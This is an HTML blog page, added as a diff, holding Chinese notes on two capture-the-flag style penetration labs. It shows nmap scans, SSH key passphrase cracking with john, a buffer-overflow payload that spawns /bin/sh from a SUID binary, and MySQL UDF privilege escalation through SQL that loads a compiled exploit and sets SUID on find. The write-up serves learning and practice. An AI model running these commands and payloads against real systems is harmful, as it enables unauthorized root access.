@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="disshu">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="渗透实战笔记">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="disshu">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>disshu</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">渗透实战笔记</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/disshu.github.io/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/disshu.github.io/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/disshu">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:15695257867@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By disshu</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-02-03</span>
+            <span class="time">06:29:36</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>一天一渗透,提升自己</p>
+<a id="more"></a>
+<h1 id="covfefe渗透实战"><a href="#covfefe渗透实战" class="headerlink" title="covfefe渗透实战"></a>covfefe渗透实战</h1><p><code>nmap -sS -Pn -A -p- -n 192.168.8.139</code><br>首先扫描网段 nmap -sn xxxx/24<br>扫可疑端口目录<br>ssh 可以 用私钥登陆 与服务器上的公钥进行认证 认证成功就登陆<br><code>ssh -i 私钥文件 用户名@ip</code><br>扫目录有的为了寻找ssh的私钥文件 私钥有的带密码 需要进一步破解<br>找到文件后需要赋予权限 chmod 600(只有拥有者有读写权限。)<br> 查看<br> <code>ls -alh</code><br> 破解私钥文件密码<br><code>locate ssh2john</code><br><code>python 路径名.py 私钥文件&gt;isacrack</code><br><code>john isacrack</code><br>破解密码成功<br>进入ssh控制 cd /root 进入root目录<br>最重要的是提权,这里介绍溢出提权<br>首先要找到以目前的权限能够执行的文件<br><code>find / -perm -4000 2&gt;/dev/null</code><br>c文件 溢出关键函数 比较<br>int strncmp(str1,str2,n)<br>参数<br>    str1 – 要进行比较的第一个字符串。<br>    str2 – 要进行比较的第二个字符串。<br>    n – 要比较的最大字符数。<br>返回值<br>该函数返回值如下：<br>    如果返回值 &lt; 0，则表示 str1 小于 str2。<br>    如果返回值 &gt; 0，则表示 str2 小于 str1。<br>    如果返回值 = 0，则表示 str1 等于 str2。<br>例如这题中</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">char</span> a[]=<span class="hljs-string">"simon"</span>;
+<span class="hljs-keyword">char</span> buf[<span class="hljs-number">20</span>];
+<span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(a,buf,<span class="hljs-number">5</span>))
+&#123;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"xxx %s"</span>,buf)
+&#125;</code></pre>
+
+<p>溢出前二十个字节就可以溢出<br>payloads<br><code>simon000000000000000/bin/sh</code><br>跳转到/bin/sh<br>whoami<br>pwd</p>
+<h1 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h1><p>如果发现他是wordpress后台可以利用wpscan扫描一下目录<br><code>wpscan --url http://ip/wordpress/ --wp-content-dir -ep -et -eu</code><br>可以获得用户名,ssh尝试登陆 通常密码也是用户名<br>利用LinEnum.sh 发现mysql由root权限就可以考虑这个漏洞<br>windows下<br>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/<br>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限。<br>我们可以在kali中<br><code>searchsploit mysql udf</code><br>切换当前目录到/var/www/html/wordpress目录下，并查找wp-config文件，这个文件会存储着MySQL数据库的密码。udf的使用需要我们登陆数据库<br>找到udf对应的文件后<br>先将原始的C语言代码编译成.so文件，然后再上传到靶机中运行来利用这个MySQL漏洞。<br>第一步是编译。</p>
+<pre><code class="hljs undefined">searchsploit –m <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span>
+gcc -g -shared -Wl,-soname,<span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> -o <span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span> -lc</code></pre>
+
+<p>之后在/tmp 用wget下载so,打开mysql,输入如下语句</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(line <span class="hljs-built_in">blob</span>);
+<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/tmp/1518.so'</span>));
+<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">'/usr/lib/mysql/plugin/1518.so'</span>;
+<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-built_in">integer</span> <span class="hljs-keyword">soname</span> <span class="hljs-string">'1518.so'</span>;
+<span class="hljs-keyword">select</span> do_system(<span class="hljs-string">'chmod u+s /usr/bin/find'</span>);</code></pre>
+
+<p>现在，我们切回到/tmp目录，然后使用“find”程序来执行命令。</p>
+<pre><code class="hljs undefined">touch raj
+<span class="hljs-builtin-name">find</span> raj –exec <span class="hljs-string">"whoami"</span> \;
+<span class="hljs-builtin-name">find</span> raj –exec <span class="hljs-string">"/bin/sh"</span> \;
+cd /root
+ls
+cat flag4.txt</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/disshu.github.io/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
